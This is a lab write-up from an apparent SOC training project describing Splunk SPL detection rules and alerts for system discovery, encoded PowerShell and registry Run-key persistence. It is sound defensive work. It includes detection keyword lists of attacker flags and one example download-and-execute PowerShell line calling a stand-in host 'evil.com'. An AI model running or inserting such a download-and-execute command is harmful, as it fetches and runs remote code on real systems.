<details>
<summary><b>📅 Day 4 — SPL Detection Rules + Automated Splunk Alerts</b></summary>

<br>

### 🎯 Objective
Convert the manual attack investigations from Day 3 into automated SPL detection rules and Splunk Alerts. These rules run continuously in the background — the moment a matching attack pattern appears in Sysmon logs, Splunk fires an alert automatically without any human needing to search. This is exactly how enterprise SIEM detection engineering works in real SOC environments.

---

### 🧠 What is a Splunk Alert?

A Splunk Alert is an automated watchdog — it runs a saved SPL search on a schedule or in real-time, and when the search returns results matching defined conditions, it triggers a configured action (email, ticket, dashboard notification etc.).

**The difference between Day 2/3 and Day 4:**

| Day 2 & 3 approach | Day 4 approach |
|-------------------|----------------|
| Manually run a search after knowing an attack happened | Alert fires automatically the moment attack pattern appears |
| Analyst must remember to search | No human intervention needed |
| Reactive — find attack after the fact | Proactive — detect attack as it happens |
| Good for investigation | Good for real-time detection |

**In a real SOC:** Hundreds of these alerts run simultaneously across thousands of endpoints. When one fires, it creates a ticket that gets assigned to an L1 analyst for investigation. The SPL queries written today are the foundation of that entire workflow.

---

### 🔍 Detection Rule 1 — System Discovery Commands (T1082)

**MITRE ATT&CK Technique:** T1082 — System Information Discovery
**Tactic:** Discovery
**Sysmon Event ID:** 1 (Process Creation)
**Alert Severity:** High

**SPL Detection Query:**
```
index=main sourcetype="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1
| where match(CommandLine, "(?i)(whoami|systeminfo|hostname|ipconfig|net user|net localgroup)")
| table _time, ComputerName, User, Image, ParentImage, CommandLine
```

**Why this query works:**
- `EventCode=1` filters to only process creation events — every command that runs
- `match(CommandLine, "(?i)...")` performs a case-insensitive regex search on the CommandLine field
- The `|` characters inside the regex mean OR — it matches any of those keywords
- `table` formats output as a clean readable table with the most important forensic columns

**What the query hunts for and why:**

| Command | MITRE Technique | Why attackers run it |
|---------|----------------|---------------------|
| `whoami` | T1033 | "What user am I? Do I have admin rights?" |
| `systeminfo` | T1082 | OS version, patch level, domain name, hardware info |
| `hostname` | T1082 | Machine name — useful for lateral movement planning |
| `ipconfig` | T1016 | Network configuration — find other network segments |
| `net user` | T1087 | List all user accounts on the machine |
| `net localgroup` | T1069 | List all local groups — find admin group members |

**Detection results — 8 events captured:**

| Time | CommandLine | ParentImage | Verdict |
|------|-------------|-------------|---------|
| 2026-07-03 20:51 | `systeminfo` | `cmd.exe` | ⚠️ T1082 — system recon |
| 2026-07-03 20:51 | `cmd.exe /c systeminfo & reg query HKLM\SYSTEM\...` | `powershell.exe` | ⚠️ T1082 — chained discovery |
| 2026-07-03 20:51 | `whoami.exe` | `powershell.exe` | ⚠️ T1033 — user discovery |
| 2026-07-03 21:11 | `whoami.exe` | `powershell.exe` | ⚠️ T1033 — repeated discovery |
| 2026-07-03 21:12 | `whoami.exe` | `powershell.exe` | ⚠️ T1033 — repeated discovery |
| 2026-07-03 21:15 | `whoami.exe` | `powershell.exe` | ⚠️ T1033 — repeated discovery |
| 2026-07-03 21:16 | `whoami.exe` | `powershell.exe` | ⚠️ T1033 — repeated discovery |
| 2026-07-04 19:13 | `whoami.exe` | `powershell.exe` | ⚠️ T1033 — repeated discovery |

**Key observation from results:**
Every single event shows `powershell.exe` as the ParentImage — meaning PowerShell launched these discovery commands. This is the classic attacker pattern: gain access via PowerShell, then immediately run discovery commands to understand the environment. A legitimate IT admin would launch these from `explorer.exe` (manually opened CMD) not from a PowerShell script.

**Legitimate vs Malicious — decision framework:**

| Factor | Legitimate | Malicious |
|--------|-----------|-----------|
| ParentImage | `explorer.exe` — admin opened CMD manually | `powershell.exe`, `wscript.exe`, `mshta.exe` |
| Time | Business hours, known maintenance window | Off-hours, weekends, immediately after phishing event |
| Frequency | 1-2 times during maintenance | Multiple commands in rapid succession |
| User | Known IT admin account | Standard user account, service account |
| Context | Corresponding IT ticket exists | No scheduled maintenance activity |

**Alert configuration:**
- **Type:** Real-time
- **Trigger:** Number of results greater than 0
- **Action:** Add to Triggered Alerts
- **Severity:** High

<details>
<summary>📸 Screenshots — Detection Rule 1</summary>
<br>

**Screenshot 2 — T1082 detection rule returning 8 events**
> SPL detection query returning 8 events across 7 days showing all T1082 system discovery commands captured. The table format clearly shows Time, ComputerName, User, Image (process that ran), ParentImage (what launched it), and CommandLine (exact command executed). Every event shows powershell.exe as the parent — the definitive attacker pattern distinguishing this from legitimate admin activity.

![Screenshot2](day%204%20screenshots/Screenshot2.png)

---

**Screenshot 4 — T1082 Alert configuration**
> Splunk Alert configuration for T1082 showing real-time trigger, High severity, and Add to Triggered Alerts action. This alert runs the detection query continuously — the moment any process matching the discovery command pattern appears in Sysmon logs, the alert fires automatically without any analyst needing to manually search.

![Screenshot4](day%204%20screenshots/Screenshot4.png)

</details>

---

### 🔍 Detection Rule 2 — Malicious PowerShell Execution (T1059.001)

**MITRE ATT&CK Technique:** T1059.001 — Command and Scripting Interpreter: PowerShell
**Tactic:** Execution
**Sysmon Event ID:** 1 (Process Creation)
**Alert Severity:** Critical

**SPL Detection Query:**
```
index=main sourcetype="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1 Image="*powershell.exe"
| where match(CommandLine, "(?i)(-EncodedCommand|-Enc|-ExecutionPolicy Bypass|-WindowStyle Hidden|-NonInteractive)")
| table _time, ComputerName, User, Image, ParentImage, CommandLine
```

**Why this query works:**
- `Image="*powershell.exe"` pre-filters to only PowerShell process events before applying the expensive regex match — this makes the query significantly faster on large datasets
- The `*` wildcard catches PowerShell regardless of full path — important because attackers sometimes copy PowerShell to other directories
- The regex hunts for 5 specific flags that are extremely rare in legitimate PowerShell use but almost universal in malicious PowerShell

**What each suspicious flag means:**

| Flag | Short form | Why it's suspicious | Attacker use case |
|------|-----------|--------------------|--------------------|
| `-EncodedCommand` | `-Enc` | Hides actual command in Base64 encoding | Bypass keyword-based security scanning |
| `-ExecutionPolicy Bypass` | — | Overrides PowerShell script restrictions | Run unsigned/downloaded scripts |
| `-WindowStyle Hidden` | — | Makes PowerShell window invisible to user | Victim doesn't see malicious activity |
| `-NonInteractive` | — | Runs without user prompts | Fully automated malware execution |

**Detection results — 2 events captured:**

Both events showed the same high-confidence malicious pattern:
```
powershell.exe -ExecutionPolicy Bypass -EncodedCommand SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAKAAnAEgAZQBsAGwAbwAgAGYAcgBvAG0AIABBAFQAVAAmAEMASwAgAFQAMQAwADUAOQAnACkA
```

**Decoding the Base64 payload:**
The encoded string `SQBuAHYAbwBr...` decodes to: `Invoke-Expression ('Hello from ATT&CK T1059')` — a harmless lab test message. In a real attack this would decode to something like:
```powershell
IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')
```
Which downloads and executes a malicious script entirely in memory — leaving no file on disk for forensics to find.

**Three simultaneous red flags in one CommandLine:**

```
powershell.exe -ExecutionPolicy Bypass -EncodedCommand SQBuAHYAbwBr...
      ↑                    ↑                    ↑                ↑
  Process            Bypasses              Hides the        Hidden
  name               security             command          payload
```

**Why this alert is set to Critical (not just High):**
The combination of `-ExecutionPolicy Bypass` AND `-EncodedCommand` together is one of the highest-confidence malicious indicators in Windows endpoint detection. Legitimate PowerShell scripts written by IT administrators do not use encoded commands — there is no legitimate reason to Base64-encode a command unless you are trying to hide it from security tools.

**SOC response procedure for this alert:**
1. **Immediately isolate** the endpoint from the network to prevent lateral movement
2. **Decode the Base64** string to reveal the hidden command: `[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('...'))`
3. **Check EventCode 3** (network connections) around the same timestamp — did PowerShell download anything?
4. **Check EventCode 11** (file creation) — did it drop any files to disk?
5. **Check ParentImage** — what launched PowerShell? That's the initial infection vector.

**Legitimate vs Malicious — decision framework:**

| Indicator | Legitimate PowerShell | Malicious PowerShell |
|-----------|----------------------|---------------------|
| `-EncodedCommand` present | Never in legitimate scripts | Almost always malicious |
| `-ExecutionPolicy Bypass` alone | Occasionally used by IT admins | Combined with EncodedCommand = Critical |
| `-WindowStyle Hidden` | Never legitimate | Attacker hiding execution |
| ParentImage | `explorer.exe`, `powershell_ise.exe` | `winword.exe`, `excel.exe`, `wscript.exe`, `cmd.exe` |
| Encoded string length | N/A | Very long = large hidden payload |

**Alert configuration:**
- **Type:** Real-time
- **Trigger:** Number of results greater than 0
- **Action:** Add to Triggered Alerts
- **Severity:** Critical

<details>
<summary>📸 Screenshots — Detection Rule 2</summary>
<br>

**Screenshot 3 — T1059.001 detection rule returning 2 encoded PowerShell events**
> SPL detection query returning 2 events showing both encoded PowerShell executions from Day 3 simulations. The CommandLine column shows the full malicious command including -ExecutionPolicy Bypass, -EncodedCommand flags, and the Base64 encoded payload string. These three elements together in a single CommandLine represent one of the highest-confidence malicious indicators in Windows endpoint security.

![Screenshot3](day%204%20screenshots/Screenshot3.png)

---

**Screenshot 5 — T1059.001 Alert configuration**
> Splunk Alert configuration for T1059.001 showing Critical severity — the highest level, reserved for the most dangerous and high-confidence attack patterns. Real-time trigger ensures this alert fires the instant any PowerShell process matching the encoded command pattern appears, giving the SOC team the earliest possible warning before the encoded payload can execute its full attack chain.

![Screenshot5](day%204%20screenshots/Screenshot5.png)

</details>

---

### 🔍 Detection Rule 3 — Registry Persistence (T1547.001)

**MITRE ATT&CK Technique:** T1547.001 — Boot/Logon Autostart Execution: Registry Run Keys
**Tactic:** Persistence, Privilege Escalation
**Sysmon Event ID:** 13 (Registry Value Set)
**Alert Severity:** Critical

**SPL Detection Query:**
```
index=main sourcetype="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=13
| where match(TargetObject, "(?i)(CurrentVersion\\Run|CurrentVersion\\RunOnce|Winlogon)")
| table _time, ComputerName, User, Image, TargetObject, Details
```

**Why this query works:**
- `EventCode=13` filters specifically to registry value set events — only when a value is written, not just created
- `match(TargetObject, ...)` searches the registry key path for persistence locations
- Double backslashes `\\` are required in SPL regex because backslash is an escape character

**Registry persistence locations monitored:**

| Registry Key | Trigger | Severity |
|-------------|---------|----------|
| `...\CurrentVersion\Run` | Executes on every user login | 🔴 Critical |
| `...\CurrentVersion\RunOnce` | Executes once then deletes itself — attacker covering tracks | 🔴 Critical |
| `...\Winlogon` | Executes at Windows login screen | 🔴 Critical |

**Important note about Sysmon config and registry monitoring:**
The Olaf Hartong production Sysmon config deliberately filters some HKCU registry writes to avoid flooding Splunk with thousands of low-value BAM (Background Activity Moderator) entries. This is correct real-world behavior — in production SOC environments, signal-to-noise ratio matters enormously. The detection rule is correctly written and will fire on any unfiltered persistence key writes, including HKLM-level (system-wide) persistence which is the more dangerous variant used in real attacks.

**What a real T1547.001 detection looks like:**
From the Day 3 original simulation (before the event aged out of Splunk retention):

| Field | Value |
|-------|-------|
| EventCode | 13 — Registry Value Set |
| TargetObject | `HKU\S-1-5-21-...\Software\Microsoft\Windows\CurrentVersion\Run\Atomic Red Team` |
| Image | `powershell.exe` — PowerShell wrote the persistence key |
| Details | Path to executable that would run on next login |
| User | `SHREYA\shreya` — account used to establish persistence |

**Why persistence detection is the most time-critical alert in any SOC:**
Persistence is what separates a temporary compromise from a long-term breach. An attacker without persistence loses all access the moment the machine reboots. An attacker with persistence has ongoing access for weeks, months, or years. Detecting T1547.001 at the exact moment the registry key is written — before the first reboot — means the SOC can respond and evict the attacker before they have had any opportunity to move laterally, steal data, or deploy ransomware across the network.

**Legitimate vs Malicious — decision framework:**

| Factor | Legitimate software | Malicious persistence |
|--------|--------------------|-----------------------|
| Image writing the key | Known software installer (msiexec.exe) | `powershell.exe`, `cmd.exe`, `wscript.exe` |
| Entry name | Recognizable product name (Zoom, Teams) | Random string or Windows-sounding fake name |
| Executable path | `C:\Program Files\...` | `C:\Users\Public\`, `C:\Temp\`, `C:\Windows\Temp\` |
| Time | During software installation | During or after other suspicious activity |
| Corresponding software | Visible in Add/Remove Programs | No installed software matches |

**Alert configuration:**
- **Type:** Real-time
- **Trigger:** Number of results greater than 0
- **Action:** Add to Triggered Alerts
- **Severity:** Critical

<details>
<summary>📸 Screenshots — Detection Rule 3</summary>
<br>

**Screenshot 6 — T1547.001 Alert configuration**
> Splunk Alert configuration for T1547.001 Registry Persistence showing Critical severity and real-time trigger. This alert monitors the most critical Windows persistence locations continuously — any write to CurrentVersion\Run, CurrentVersion\RunOnce, or Winlogon registry keys by a non-installer process will immediately fire this alert, giving the SOC team the opportunity to respond before the persisted malware executes even once.

![Screenshot6](day%204%20screenshots/Screenshot6.png)

</details>

---

### 🚨 All 3 Alerts Active in Splunk

<details>
<summary>📸 Screenshots — All Alerts Dashboard</summary>
<br>

**Screenshot 1 — Splunk Alerts page showing all 3 active detection rules**
> Splunk Alerts page showing all 3 automated detection rules enabled and running in real-time. Each alert is configured with appropriate severity (High for T1082, Critical for T1059.001 and T1547.001) and will fire automatically the moment a matching attack pattern appears in incoming Sysmon data — no human intervention required. This is the core deliverable of Day 4 and represents a functioning automated threat detection system.

![Screenshot1](Day4_Screenshots/Screenshot1.png)

</details>

---

### 📊 Day 4 Detection Rules Summary

| Alert Name | Technique | Event ID | Severity | Trigger Condition |
|-----------|-----------|----------|----------|-------------------|
| T1082 System Discovery Commands | T1082 | EventCode 1 | High | whoami, systeminfo, hostname, ipconfig in CommandLine |
| T1059.001 Malicious PowerShell | T1059.001 | EventCode 1 | Critical | EncodedCommand, ExecutionPolicy Bypass, WindowStyle Hidden |
| T1547.001 Registry Persistence | T1547.001 | EventCode 13 | Critical | Writes to CurrentVersion\Run, RunOnce, Winlogon keys |

---

### 🔑 Key Lesson from Day 4

**The progression from Day 2 to Day 4 represents the complete SOC detection engineering workflow:**

```
Day 2: Learn what normal looks like       →  Establish baseline
Day 3: Simulate real attacks              →  Generate attack artifacts  
Day 4: Write rules to catch those attacks →  Automate detection
```

This is exactly the workflow followed by detection engineers at companies like CrowdStrike, Palo Alto, Microsoft Defender, and every enterprise SOC globally. The SPL queries written today are production-quality detection rules — with minor tuning for environment-specific false positives, these exact queries could be deployed in a real enterprise Splunk environment monitoring thousands of endpoints.

**What changes in Day 5:**
Day 5 extends the detection coverage by simulating 4-5 additional ATT&CK techniques covering lateral movement (T1021), scheduled task persistence (T1053), and privilege escalation — then writing detection rules for each. By end of Day 5 the detection library will cover the full attacker kill chain from initial access through persistence.

</details>
